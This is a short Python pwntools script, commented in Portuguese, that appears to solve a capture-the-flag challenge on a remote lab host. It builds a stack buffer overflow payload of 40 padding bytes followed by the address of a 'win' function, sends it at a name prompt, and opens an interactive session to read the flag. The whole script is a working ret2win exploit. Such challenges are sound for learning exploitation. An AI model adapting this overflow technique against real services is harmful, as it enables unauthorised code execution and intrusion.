from pwn import *


#modificar host e porta para verificar caso de segurança no futuro.
host = 'xebec.cylabacademy.net'
port = 43779

p = remote(host, port)

# Endereço da win (use o endereço exato da função)
win_addr = 0x401256  # ou 0x401265 se quiser ir direto na instrução após o prólogo

# Padding de 40 bytes (32 do buffer + 8 do RBP)
padding = b'A' * 40

# Monta o payload
payload = padding + p64(win_addr)

# Envia para o prompt do programa
p.sendlineafter(b'Please enter your name: ', payload)

# Mantém a sessão aberta para exibir a flag
p.interactive()
